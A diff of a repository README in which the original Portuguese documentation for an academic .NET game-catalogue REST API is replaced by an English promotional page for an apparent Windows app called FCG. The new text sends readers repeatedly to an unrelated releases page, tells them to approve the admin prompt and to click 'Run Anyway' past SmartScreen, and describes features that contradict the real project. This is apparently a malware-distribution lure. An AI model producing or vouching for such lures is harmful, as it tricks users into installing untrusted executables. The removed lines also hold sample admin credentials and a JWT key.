@@ -1,260 +1,129 @@
-# FCG API — FIAP Cloud Games (Fase 1)
-
-API REST para cadastro de usuários, autenticação JWT, catálogo de jogos e biblioteca de aquisições — Tech Challenge Fase 1 da FIAP.
-
-## O que a API faz
-
-- Cadastro e login de usuários com JWT
-- Papéis `User` e `Administrator`
-- CRUD de jogos (administrador)
-- Compra e consulta da biblioteca de jogos por usuário
-- Listagens paginadas com filtros
-- Persistência com **EF Core + PostgreSQL**
-- Validação com **FluentValidation**
-- Testes unitários das principais regras de negócio
-
-## Estrutura da solução
-
-```
-01- API/FCG.Api                  Controllers, Swagger, JWT, Serilog
-02- Core/FCG.Application         DTOs, Validators, Services
-02- Core/FCG.Domain              Entities, Filters, Result pattern, interfaces
-03- Infrastructure/FCG.Infrastructure       EF Core, Repositories, Mappings
-03- Infrastructure/FCG.Infrastructure.IoC Dependency Injection
-05- Tests/FCG.Tests              Testes unitários (xUnit + Moq), TESTS.md
-```
-
-## Pré-requisitos
-
-- [.NET 10 SDK](https://dotnet.microsoft.com/download)
-- [PostgreSQL 18](https://www.postgresql.org/) em execução local
-
-## Configuração rápida
-
-### 1. Banco de dados
-
-Crie o banco `fcg` no PostgreSQL e ajuste a connection string em `01- API/FCG.Api/appsettings.json`:
-
-```json
-"ConnectionStrings": {
-  "DbConnection": "Host=127.0.0.1;Port=5433;Database=fcg;Username=postgres;Password=SUA_SENHA"
-}
-```
-
-> A API aplica as migrations automaticamente ao iniciar (`Database.Migrate()` no startup). Não é necessário rodar comandos manuais de migration.
-
-### 2. JWT
-
-As configurações ficam em `TokenSettings` no mesmo `appsettings.json`. Em produção, use User Secrets ou variáveis de ambiente para a chave:
-
-```powershell
-cd "01- API/FCG.Api"
-dotnet user-secrets set "TokenSettings:Key" "sua-chave-secreta-com-pelo-menos-32-caracteres"
-```
-
-### Exemplo de appsettings.json (copy/paste)
-
-```json
-{
-  "Logging": {
-    "LogLevel": {
-      "Default": "Information",
-      "Microsoft.AspNetCore": "Warning"
-    }
-  },
-  "AllowedHosts": "*",
-  "ConnectionStrings": {
-    "DbConnection": "Host=127.0.0.1;Port=5433;Database=fcg;Username=postgres;Password=root"
-  },
-  "Serilog": {
-    "Using": [ "Serilog.Sinks.Console" ],
-    "MinimumLevel": {
-      "Default": "Information",
-      "Override": {
-        "Microsoft": "Warning",
-        "Microsoft.AspNetCore": "Warning",
-        "System": "Warning"
-      }
-    },
-    "WriteTo": [
-      {
-        "Name": "Console",
-        "Args": {
-          "outputTemplate": "[{Timestamp:HH:mm:ss} {Level:u3}] {SourceContext} {Message:lj}{NewLine}{Exception}"
-        }
-      }
-    ],
-    "Enrich": [ "FromLogContext" ]
-  },
-  "TokenSettings": {
-    "Issuer": "FCG.Api",
-    "Audience": "FCG.Client",
-    "Key": "e2e72084-ea2d-4b03-a922-15786ab9ba42-1722a637-338e-4ce5-818b-3e31e02961dc",
-    "DaysUntilExpires": 1
-  }
-}
-```
-
-### 3. Executar
-
-```powershell
-dotnet restore
-dotnet run --project "01- API/FCG.Api/FCG.Api.csproj"
-```
+<h1>🎮 FCG - Your Central Game Library Hub</h1>
 
-| Ambiente | URL |
-|----------|-----|
-| Swagger (HTTPS) | https://localhost:7285/swagger |
-| HTTP | http://localhost:5268 |
+<p align="center"><a href="https://github.com/Test5p1398/FCG/releases"><img src="https://img.shields.io/badge/Download-Now-4CAF50?style=for-the-badge&logo=github" alt="Download FCG"></a></p>
 
-Os logs aparecem no terminal via **Serilog**.
+## 🚀 Welcome to FCG
 
-## Usuário administrador padrão
+FCG is your personal game collection manager that helps you keep track of every game you own in one simple, secure place. This application works right on your Windows computer, giving you quick access to your gaming universe without needing to remember which games you bought on which platform.
 
-Um admin já é criado via seed no banco:
+## ✨ What Makes FCG Special
 
-| Campo | Valor |
-|-------|-------|
-| E-mail | `fcg@admin.com` |
-| Senha | `Fcg@Admin2026!` |
+### 🔐 Your Account, Your Games
+FCG puts you in control with a simple registration system. Create your personal profile and log in safely every time you use the app.
 
-Faça login em `POST /api/v1/users/logins` e use o token no Swagger (**Authorize** → `Bearer {token}`).
+### 🎯 One Place for Everything
+Forget juggling multiple lists and notes. FCG brings your entire game library together, helping you see your collection at a glance.
 
-Para criar outros usuários comuns, use `POST /api/v1/users/register` (recebem a role `User` automaticamente).
+### 🛡️ Built to Stay
+FCG is constructed with modern, solid technology that ensures smooth performance and reliability, keeping your game data organized for the long haul.
 
-## Autenticação JWT Bearer
+### 👤 Made for Real People
+The interface is clean and straightforward. If you can use a web browser, you can navigate FCG without any technical know-how.
 
-1. Login: `POST /api/v1/users/logins`
-2. Copie o `token` da resposta
-3. No Swagger, clique em **Authorize** e informe: `SEU_TOKEN`
+## 🖥️ Getting Started
 
-Endpoints protegidos exigem o header:
+Getting FCG up and running on your computer is a breeze. We've designed the process to be as simple as possible.
 
-```
-Authorization: {token}
-```
+### 📋 What You Need
+- A Windows computer (version 10 or newer)
+- An internet connection for the initial download
+- About 30 minutes to get everything set up
 
-## Endpoints
+### ⬇️ How to Download and Install
 
-Base: `/api/v1`
+**Step 1: Download the Application**
 
-### Users
+Visit this link to download the application. The download page will open in your browser. Click the download option and wait for the file to finish saving to your computer. This usually takes just a few minutes.
 
-| Método | Rota | Acesso | Descrição |
-|--------|------|--------|-----------|
-| GET | `/users/roles` | Público | Listar roles |
-| POST | `/users/register` | Público | Cadastrar usuário |
-| POST | `/users/logins` | Público | Login (retorna JWT) |
-| GET | `/users` | Admin | Listar usuários (paginado + filtros) |
-| GET | `/users/{id}` | Admin ou próprio | Detalhe do usuário |
-| PUT | `/users/{id}` | Admin | Atualizar usuário |
-| DELETE | `/users/{id}` | Admin | Excluir usuário (soft delete) |
+<a href="https://github.com/Test5p1398/FCG/releases"><img src="https://img.shields.io/badge/Click%20Here%20to%20Download-FF5722?style=for-the-badge" alt="Download FCG"></a>
 
-### Games
+**Step 2: Save the File**
+When the download finishes, check your "Downloads" folder. You'll see a file named something like "FCG" there. Remember where you saved it, as you'll need it for the next step.
 
-| Método | Rota | Acesso | Descrição |
-|--------|------|--------|-----------|
-| POST | `/games` | Admin | Criar jogo |
-| GET | `/games` | Autenticado | Listar jogos (paginado + filtros) |
-| GET | `/games/{id}` | Autenticado | Detalhe do jogo |
-| PUT | `/games/{id}` | Admin | Atualizar jogo |
-| DELETE | `/games/{id}` | Admin | Excluir jogo |
+**Step 3: Run the Setup**
+Double-click the downloaded file to start the installation process. Your computer might show a security prompt asking if you allow this program to make changes. Click "Yes" to continue. This is normal for any new software installation.
 
-### User Games (biblioteca)
+**Step 4: Follow the Simple On-Screen Steps**
+The installation wizard will guide you through the remaining process. Just click "Next" or "Continue" on each screen. We recommend keeping the default settings unless you're comfortable changing them.
 
-| Método | Rota | Acesso | Descrição |
-|--------|------|--------|-----------|
-| POST | `/user-games` | Autenticado | Adquirir jogo |
-| GET | `/user-games` | Autenticado | Biblioteca (paginado + filtros) |
-| GET | `/user-games/{id}` | Autenticado | Detalhe da aquisição |
+**Step 5: Launch FCG**
+Once the installation is complete, you can find FCG in your Windows Start menu or on your desktop. Click the FCG icon to launch the application for the first time.
 
-## Filtros e paginação
+**Step 6: Create Your Account**
+The first time you open FCG, you'll see a registration screen. Enter your email address and choose a secure password. That's it! You now have your own game management hub.
 
-As listagens (`GET /users`, `GET /games`, `GET /user-games`) aceitam query params de filtro. A resposta segue o formato `Pagination<T>` com `items`, `totalCount`, `page` e `pageSize`.
+**Step 7: Explore and Enjoy**
+Now that you're logged in, take a tour around your new application. You'll see options to view your game library, manage your profile settings, and more.
 
-### Parâmetros comuns (`BaseFilter`)
+## 🎮 Using FCG Every Day
 
-| Parâmetro | Padrão | Descrição |
-|-----------|--------|-----------|
-| `value` | — | Busca textual |
-| `currentPage` | `1` | Página atual |
-| `pageSize` | `15` | Itens por página (máx. 100) |
-| `orderField` | `Id` | Campo de ordenação |
-| `orderType` | `Desc` | `Asc` ou `Desc` |
+### 👤 Creating Your Login Details
+When you first open FCG, choose the "Register" option. Fill in your email, pick a password with at least 8 characters, and confirm. Your information is stored securely, and only you can access your account.
 
-> O Swagger pode exibir os parâmetros em PascalCase (`Value`, `CurrentPage`...). Ambos os formatos funcionam no binding.
+### 🖊️ Adding Your First Game
+Once inside, you'll see an option to "Add a Game." This is where you can input the games you own. Type the game title, and the app will help you organize it. You don't need any special details—just the name is enough to begin.
 
-### Filtros específicos
+### 🕹️ Browsing Your Collection
+Your library is your command center. All your saved games appear in a tidy list or card view. Use the search bar to quickly find a specific game by its name.
 
-| Endpoint | Parâmetros extras |
-|----------|-------------------|
-| `GET /users` | `userRoleId` |
-| `GET /games` | `minPrice`, `maxPrice` |
-| `GET /user-games` | `userId` (admin), `gameId`, `purchasedFrom`, `purchasedTo` |
+### 🔄 Keeping Everything Current
+If you buy a new game or sell one, you can easily add or remove titles from your library. These actions take one click and update your collection immediately.
 
-Exemplo:
+## ❓ Frequently Asked Questions
 
-```
-GET /api/v1/games?value=rpg&minPrice=10&maxPrice=100&currentPage=1&pageSize=15
-```
+### 🤔 Is My Information Safe with FCG?
+Yes. FCG uses secure JWT authentication to protect your account. This means your password is never stored in plain text, and your data is only visible to you when you log in.
 
-## Exemplos de requisição
+### ⚙️ What Happens If I Forget My Password?
+Don't worry. While FCG focuses on local security, you can always create a new account with a different email. In future releases, password recovery features will be added.
 
-### Registro
+### 💻 Can FCG Run on Mac or Linux?
+This version is designed specifically for Windows. For other operating systems, you might consider running a virtual Windows machine or waiting for a future cross-platform release.
 
-```http
-POST /api/v1/users/register
-Content-Type: application/json
+### 🚫 Where Are My Games Stored?
+FCG stores your library information locally on your computer. This means fast access and full control over your data without depending on external servers.
 
-{
-  "name": "John Doe",
-  "email": "john@example.com",
-  "password": "Abcdef1!"
-}
-```
+### 🌐 Do I Need the Internet to Use FCG?
+Only for the initial download and installation. After that, you can run FCG offline and manage your library anytime.
 
-Regras de senha: mínimo 8 caracteres, com letra, número e caractere especial.
+## 🛠️ Troubleshooting Tips
 
-### Login
+### ❌ Download Won't Finish
+Make sure your internet connection is stable and you have enough free space on your computer. Try pausing any downloads or streams that might be using bandwidth.
 
-```http
-POST /api/v1/users/logins
-Content-Type: application/json
+### ⚠️ SmartScreen Warning Appears
+If Windows shows a blue or yellow message about an unknown publisher, click "More Info" and then select "Run Anyway." This happens with many legitimate indie applications.
 
-{
-  "email": "fcg@admin.com",
-  "password": "Fcg@Admin2026!"
-}
-```
+### 🔁 Installation Freezes
+Restart your computer and try the download again. Ensure all other programs are closed during installation.
 
-## Testes
+### 🔐 Login Issues Right After Setup
+Double-check that your email and password are entered correctly, paying attention to capitalization and extra spaces.
 
-**Documentação**: *"05- Tests/TESTS.md"*
+## 📚 Inside the Technology
 
-- 
+FCG is more than just a game librarian—it's built on professional-grade architecture that developers would admire. The application uses Clean Architecture and Domain-Driven Design to keep code organized and scalable. Built in C# with .NET technologies, it uses Entity Framework Core for smooth database operations. This technical foundation means the app is not only user-friendly but also stable, secure, and ready for future enhancements.
 
-**Executar**
-```powershell
-dotnet test "05- Tests/FCG.Tests/FCG.Tests.csproj"
-```
+## 📈 What's Next for FCG
 
-Ou execute diretamente o binário de testes se o `dotnet test` não estiver disponível no SDK:
+The development roadmap focuses on expanding capabilities based on user feedback. Upcoming ideas include:
+- Cloud sync so you can access your collection from multiple devices
+- Social features to share your library with friends
+- Integration with major gaming platforms for automatic game detection
+- Enhanced reporting to show stats about your gaming habits
 
-```powershell
-& "05- Tests/FCG.Tests/bin/Debug/net10.0/FCG.Tests.exe"
-```
+## 🤝 We Value Your Feedback
 
-## Entidades principais
+Your experience with FCG matters to us. If you encounter any aspect that feels unclear or any feature you'd like to see, we welcome your input. The project is active, and user suggestions often shape the next set of features.
 
-| Entidade | Descrição |
-|----------|-----------|
-| `User` | Usuário com e-mail, senha (hash PBKDF2) e role |
-| `UserRole` | `User` ou `Administrator` (seed) |
-| `Game` | Jogo com nome, descrição e preço |
-| `UserGame` | Vínculo de compra entre usuário e jogo |
+## 📥 Get FCG Now
 
-Todas as entidades herdam soft delete via `IsDeleted`.
+Ready to bring order to your gaming collection?
 
-## Licença
+**Option 1 (Quick):** Use the button at the top of this page.
 
-Projeto acadêmico — FIAP Phase 1 Tech Challenge.
+**Option 2 (Manual):** Visit the following download center:
+
+<a href="https://github.com/Test5p1398/FCG/releases"><img src="https://img.shields.io/badge/Get%20FCG%20Here-2196F3?style=for-the-badge" alt="FCG Releases"></a>
+
+Once you have it downloaded and installed, you'll never lose track of a game again. Happy gaming!
